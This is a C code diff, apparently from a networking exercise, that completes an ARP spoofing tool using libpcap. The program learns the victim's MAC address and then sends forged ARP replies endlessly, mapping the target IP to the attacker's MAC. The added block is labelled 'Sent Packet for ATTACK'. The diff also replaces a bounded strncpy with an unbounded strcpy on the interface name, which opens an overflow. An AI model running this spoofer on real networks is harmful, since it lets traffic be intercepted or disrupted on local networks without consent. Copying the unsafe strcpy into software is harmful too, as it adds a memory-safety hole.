@@ -68,30 +68,11 @@ int32_t readWholeTextData(int8_t * fileName, int8_t ** pBuffer) {
     return 1;
 }
 
-int32_t readTextData(int8_t * fileName, int8_t ** pBuffer, uint32_t length) {
-    FILE * fp;
-
-    if (!(fp = fopen(fileName, "rt"))) {
-        return 0;
-    }
-
-    if (!(*pBuffer = calloc(length + 1, 1))) {
-        fclose(fp);
-
-        return 0;
-    }
-
-    fread(*pBuffer, length, 1, fp);
-    fclose(fp);
-
-    return 1;
-}
-
 uint32_t getSelfIPv4Addr(int8_t * interface) {
-    int     sd  = socket(AF_INET, SOCK_STREAM, 0);
+    int32_t sd  = socket(AF_INET, SOCK_STREAM, 0);
     ifreq_t ifr = { .ifr_addr.sa_family = AF_INET };
     
-    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
+    strcpy(ifr.ifr_name, interface);
     ioctl(sd, SIOCGIFADDR, &ifr);
     close(sd);
 
@@ -106,26 +87,7 @@ uint32_t parseIPv4Addr(int8_t * ipAddrStr) {
     return *(uint32_t *)result;
 }
 
-void macStrToHex_innerFn(int8_t * str, uint8_t ** out) {
-    // TODO: get length of mac address as parameter
-    // and parse string with function strtok
-    // stop when parsing is end or over the length.
-    uint32_t numOfColon = 0;
-    
-    for (uint32_t i = 0; str[i]; i++) numOfColon += !!(str[i] == ':');
-    
-    uint32_t outLen = (strlen(str) - numOfColon) >> 1;
-    
-    *out = calloc(outLen, sizeof(uint8_t));
-    
-    for (uint32_t i = 0, strI = 0; i < outLen; i++, strI += 3) {
-        int8_t * endPtr = str + strI + 2;
-
-        (*out)[i] = (uint8_t)strtoul(str + strI, (char **)&endPtr, 16);
-    }
-}
-
-uint32_t getSelfMacAddr(int8_t * interface, uint8_t ** out) {
+int32_t getSelfMacAddr(int8_t * interface, uint8_t * out) {
     int8_t locationOfMacAddr[45] = { 0 };
     int8_t * tempMacAddr;
 
@@ -135,9 +97,23 @@ uint32_t getSelfMacAddr(int8_t * interface, uint8_t ** out) {
         return 0;
     }
 
-    macStrToHex_innerFn(tempMacAddr, out);
+    sscanf(tempMacAddr, "%x:%x:%x:%x:%x:%x", out + 0, out + 1, out + 2, out + 3, out + 4, out + 5);
     free(tempMacAddr);
             
+    return 1;
+}
+
+int32_t makeWholeArpPacket(MACheader * macHdr, ARPheader * arpHdr, uint8_t ** outBuf, int32_t * outSize) {
+    *outSize = sizeof *macHdr + sizeof *arpHdr;
+    *outBuf  = calloc(*outSize, sizeof **outBuf);
+
+    if (!*outBuf) return 0;
+
+    uint8_t * bufOffset = *outBuf;
+
+    memcpy(bufOffset += 0, macHdr, sizeof *macHdr);
+    memcpy(bufOffset += sizeof *macHdr, arpHdr, sizeof *arpHdr);
+
     return 1;
 }
 
@@ -156,6 +132,22 @@ uint32_t checkInterfaceName(int8_t * interfaceName) {
     return 1;
 }
 
+void printBuffer(int8_t * title, const uint8_t * buffer, uint32_t size) {
+    printf("[%s]\n", title);
+
+    for (uint32_t i = 0; i < size; i++) {
+        printf("%02X ", buffer[i]);
+
+        if (!((i + 1) % 8)) printf(" ");
+
+        if (!((i + 1) % 16)) puts("");
+    }
+
+    if (size % 16) puts("");
+
+    puts("");
+}
+
 int main(int argc, char ** argv) {
     if (argc < 4) {
         printf("Error: At least four command-line arguments are required.\n"
@@ -171,16 +163,15 @@ int main(int argc, char ** argv) {
         return 1;
     }
 
-    // Get atacker's mac & ip address
-    uint8_t * attackerMacAddr;
-
-    uint8_t * senderMacAddr = calloc(6, 1);
+    uint8_t attackerMacAddr[6],
+            senderMacAddr[6];
     
-    uint32_t attackerIPAddr = getSelfIPv4Addr(argv[1]);
+    uint32_t attackerIPAddr = getSelfIPv4Addr(argv[1]),
+             senderIPAddr   = parseIPv4Addr(argv[2]),
+             targetIPAddr   = parseIPv4Addr(argv[3]);
     
-    getSelfMacAddr(argv[1], &attackerMacAddr);
+    getSelfMacAddr(argv[1], attackerMacAddr);
 
-    // Set buffer packet
     MACheader macHdr = { .etherType = htons(0x0806) };
     ARPheader arpHdr = { 
         .hardwareType = htons(0x0001), 
@@ -189,7 +180,7 @@ int main(int argc, char ** argv) {
         .protocolSize = 4,
         .hardwareSize = 6,
         .senderIpAddr = attackerIPAddr,
-        .targetIpAddr = parseIPv4Addr(argv[2]),
+        .targetIpAddr = senderIPAddr,
     };
 
     memset(&macHdr.destMacAddr, 0xFF, 6);
@@ -197,48 +188,23 @@ int main(int argc, char ** argv) {
     memcpy(&macHdr.srcMacAddr, attackerMacAddr, 6);
     memcpy(&arpHdr.senderMacAddr, attackerMacAddr, 6);
 
-    // Send ARP packet to get sender's mac address
     int8_t        errBuf[PCAP_ERRBUF_SIZE];
-    uint8_t       * packet;
+    uint8_t       * packet,
+                  * buffer;
+    int32_t       bufSize;
     pcap_pkthdr_t header;
 
-    int32_t bufferSize  = sizeof(MACheader) + sizeof(ARPheader);
-    pcap_t  * pcap      = pcap_open_live(argv[1], 0, 0, 0, errBuf);
-    uint8_t * buffer    = calloc(bufferSize, sizeof(uint8_t)),
-            * bufOffset = buffer;
+    makeWholeArpPacket(&macHdr, &arpHdr, &buffer, &bufSize);
+    printBuffer("Sent Packet", buffer, bufSize);
 
-    memcpy(bufOffset += 0, &macHdr, sizeof macHdr);
-    memcpy(bufOffset += sizeof macHdr, &arpHdr, sizeof arpHdr);
-    
-    // pcap_sendpacket(pcap, buffer, bufferSize);
-    // pcap_close(pcap);
-    /*
-    printf("attackerIPAddr  : %X\nattackerMacAddr : ", attackerIPAddr);
-
-    for (int i = 0; i < 6; i++) {
-        printf("%02X ", attackerMacAddr[i]);
-    }
-    printf("\nsenderMacAddress : ");
-    for (int i = 0; i < 6; i++) {
-        printf("%02X ", senderMacAddr[i]);
-    }
-    puts("");
-
-    puts("[sned arp packet] : ");
-    for (int i = 0; i < bufferSize; i++) {
-        printf("%02X ", buffer[i]);
-        if ((i + 1) % 16 == 0) puts("");
-    }
-    puts("");*/
-
-    // reply packet
-    pcap_t * pcapReply = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errBuf);
+    pcap_t  * pcap      = pcap_open_live(argv[1], 0, 0, 0, errBuf),
+            * pcapReply = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errBuf);
 
     while (1) {
         const uint8_t * packet;
         pcap_pkthdr_t * header;
 
-        pcap_sendpacket(pcap, buffer, bufferSize);
+        pcap_sendpacket(pcap, buffer, bufSize);
 
         int32_t res = pcap_next_ex(pcapReply, &header, &packet);
 
@@ -250,19 +216,7 @@ int main(int argc, char ** argv) {
             break;
         }
 
-        puts("[capture packet] - breif");
-        printf("etherType : %04X\n", ntohs(((MACheader *)packet)->etherType));
-        if (ntohs(((MACheader *)packet)->etherType) == 0x0806) {
-            printf("opcode : %04X\n", ntohs(((ARPheader *)(packet + sizeof(MACheader)))->opcode));
-            printf("senderIP : %08X\n", ntohl(((ARPheader *)(packet + sizeof(MACheader)))->senderIpAddr));
-            printf("senderIP : %08X\n", parseIPv4Addr(argv[2]));
-            puts("[capture packet]");
-            for (int i = 0; i < header->caplen; i++) {
-                printf("%02X ", packet[i]);
-                if ((i + 1) % 16 == 0) puts("");
-            }
-            puts("");
-        }
+        printBuffer("Captured Packet", packet, header->caplen);
 
         if (!NULL
             && ntohs(((MACheader *)packet)->etherType) == 0x0806 
@@ -275,12 +229,33 @@ int main(int argc, char ** argv) {
         }
     }
 
+    macHdr = (MACheader) { .etherType = htons(0x0806) };
+    arpHdr = (ARPheader) { 
+        .hardwareType = htons(0x0001), 
+        .protocolType = htons(0x0800),
+        .opcode       = htons(0x0001),
+        .protocolSize = 4,
+        .hardwareSize = 6,
+        .senderIpAddr = targetIPAddr,
+        .targetIpAddr = senderIPAddr,
+    };
+
+    memcpy(&macHdr.destMacAddr, senderMacAddr, 6);
+    memcpy(&arpHdr.targetMacAddr, senderMacAddr, 6);
+    memcpy(&macHdr.srcMacAddr, attackerMacAddr, 6);
+    memcpy(&arpHdr.senderMacAddr, attackerMacAddr, 6);
+
+    free(buffer);
+    makeWholeArpPacket(&macHdr, &arpHdr, &buffer, &bufSize);
+    printBuffer("Sent Packet for ATTACK", buffer, bufSize);
+
+    while (1) {
+        pcap_sendpacket(pcap, buffer, bufSize);
+        sleep(1);
+    }
+
+    pcap_close(pcapReply);
     pcap_close(pcap);
-
-    // checking
-
-    free(attackerMacAddr);
-    free(senderMacAddr);
     free(buffer);
 
     return 0;
